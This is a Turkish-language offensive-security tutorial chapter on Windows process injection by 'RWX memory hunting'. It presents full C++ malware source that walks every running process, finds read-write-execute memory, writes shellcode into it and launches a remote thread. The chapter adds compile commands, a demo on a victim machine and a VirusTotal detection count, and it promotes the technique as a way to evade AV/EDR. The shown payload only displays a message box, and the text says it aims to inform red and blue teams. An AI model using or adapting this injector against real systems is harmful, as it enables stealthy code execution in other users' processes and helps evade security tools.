\newpage
\subsection{28. RWX bellek avcılığı ile süreç enjeksiyonu. Basit C++ örneği.}

﷽

![injection](./images/38/2022-02-02_15-59.png){width="80%"}    

Bu, başka bir süreç enjeksiyonu tekniği üzerine yapılan bir araştırmadır.     

### RWX bellek avcılığı (RWX-memory hunting)

Hadi, [klasik](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) kod enjeksiyonu zararlı yazılımımızın mantığına bakalım:     

```cpp
//...
// allocate memory buffer for remote process
rb = VirtualAllocEx(ph, NULL, my_payload_len, 
(MEM_RESERVE | MEM_COMMIT), 
PAGE_EXECUTE_READWRITE);

// "copy" data between processes
WriteProcessMemory(ph, rb, my_payload, 
sizeof(my_payload), NULL);

// our process start new thread
rt = CreateRemoteThread(ph, NULL, 0, 
(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
//...
```

Hatırlayacağınız gibi, `VirtualAllocEx` işlevini kullanıyoruz. Bu işlev, uzak bir süreç için bellek tamponu ayırmamıza olanak tanır. Ardından, `WriteProcessMemory`, süreçler arasında veri kopyalamamıza izin verir. Ve `CreateRemoteThread`, yeni iş parçacığının hangi süreçte başlatılacağını belirlememize olanak tanır.      

Başka bir yol var mı? Evet, sistemde çalışan hedef süreçleri numaralandırmak, tahsis edilen bellek bloklarını aramak ve herhangi birinin RWX korumasıyla korunduğunu kontrol etmek mümkündür.Bu, bu bloklarda okuma/yazma/çalıştırma işlemlerine girişmeyi sağlayabilir ve bazı AV/EDR çözümlerinden kaçınmaya yardımcı olabilir.    

### pratik örnek

Bu tekniğin akışı basittir, hadi mantığını inceleyelim:  

Sistemdeki tüm süreçler arasında döngü oluşturun:      

![injection 2](./images/38/2022-02-02_18-33.png){width="80%"}   

Her bir süreçte tahsis edilen tüm bellek blokları arasında döngü oluşturun:     

![injection 3](./images/38/2022-02-02_18-35.png){width="80%"}   

Daha sonra, `RWX` korumasıyla korunan bir bellek bloğunu kontrol edin:    

![injection 4](./images/38/2022-02-02_18-36.png){width="80%"}   

Eğer uygun, bellek bloğunu yazdırın (gösterim için):     

![injection 5](./images/38/2022-02-02_18-38.png){width="80%"}   

Payload'umuzu bu bellek bloğuna yazın:      

![injection 6](./images/38/2022-02-02_18-39.png){width="80%"}   

Ardından, yeni bir uzak iş parçacığı başlatın:     

![injection 7](./images/38/2022-02-02_18-44.png){width="80%"}   

Tam C++ kaynak kodu zararlı yazılımımızın şu şekildedir:    

```cpp
/*
hack.cpp
process injection technique via 
RWX memory hunting
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/02/01/malware-injection-16.html
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char* argv[]) {
  MEMORY_BASIC_INFORMATION m;
  PROCESSENTRY32 pe;
  LPVOID address = 0;
  HANDLE ph;
  HANDLE hSnapshot;
  BOOL hResult;
  pe.dwSize = sizeof(PROCESSENTRY32);

  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return -1;

  hResult = Process32First(hSnapshot, &pe);

  while (hResult) {
    ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
    if (ph) {
      printf("hunting in %s\n", pe.szExeFile);
      while (VirtualQueryEx(ph, address, &m, sizeof(m))) {
        address = (LPVOID)(
        (DWORD_PTR)m.BaseAddress + m.RegionSize);
        if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) {
          printf("rwx memory successfully found at 0x%x :)\n", 
          m.BaseAddress);
          WriteProcessMemory(ph, m.BaseAddress, 
          my_payload, sizeof(my_payload), NULL);
          CreateRemoteThread(ph, NULL, NULL, 
          (LPTHREAD_START_ROUTINE)m.BaseAddress, 
          NULL, NULL, NULL);
          break;
        }
      }
      address = 0;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }
  CloseHandle(hSnapshot);
  CloseHandle(ph);
  return 0;
}

```

Her zamanki gibi, basitlik adına, payload olarak `meow-meow` mesaj kutusunu kullandım:     

```cpp
unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
```

### demo

Her şeyi eylemde görelim.Bizim pratilk örneğimizi derleyelim:     

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![injection 8](./images/38/2022-02-02_16-10.png){width="80%"}   

Sonra çalıştırın! Bizim durumumuzda, kurban makine `Windows 10 x64`:    

![injection 9](./images/38/2022-02-02_16-10_1.png){width="80%"}  

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı! :)    

Hadi kurban süreçlerimizden birini kontrol edelim, örneğin `OneDrive`:     

![injection 10](./images/38/2022-02-02_18-59.png){width="80%"}  

![injection 11](./images/38/2022-02-02_16-09.png){width="80%"}  

> Bir sorun var. Aşağıda verilen kod, kaba bir kavram kanıtıdır (proof-of-concept) ve bazı süreçlerin çökmesine neden olabilir.Örneğin, benim durumumda `SearchUI.exe` çöktü ve örneğimi çalıştırdıktan sonra artık çalışmıyordu.     

Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:     

![vt](./images/38/2022-02-02_19-44.png){width="80%"}    

[https://www.virustotal.com/gui/file/5835847d11b7f891e70681e2ec3a1e22013fa3ffe31a36429e7814a3be40bd97/detection](https://www.virustotal.com/gui/file/5835847d11b7f891e70681e2ec3a1e22013fa3ffe31a36429e7814a3be40bd97/detection)    

**Sonuç olarak, 69 antivirüs motorundan 7 tanesi dosyamızı zararlı olarak algıladı.**    

`Moneta64.exe` sonucu:    

![moneta](./images/38/2022-02-02_19-49.png){width="80%"}    

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, payload'unuzu kopyalamak için yeni RWX belleği tahsis etmenizi gerektirmemesidir. Bu işlem, `VirtualAllocEx` gibi daha popüler ve şüpheli bir yöntemden kaçınmanızı sağlar. `VirtualAllocEx`, mavi takım üyeleri tarafından daha sık araştırılmaktadır.     

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.      

[VirtualQueryEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)    
[CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)    
[Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)    
[Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)    
[OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)    
[Taking a snapshot and viewing processes](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)    
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)    
[CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)    
[Hunting memory](https://www.elastic.co/blog/hunting-memory)    
[Moneta64.exe](https://github.com/forrest-orr/moneta)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-02-01-malware-injection-16)    
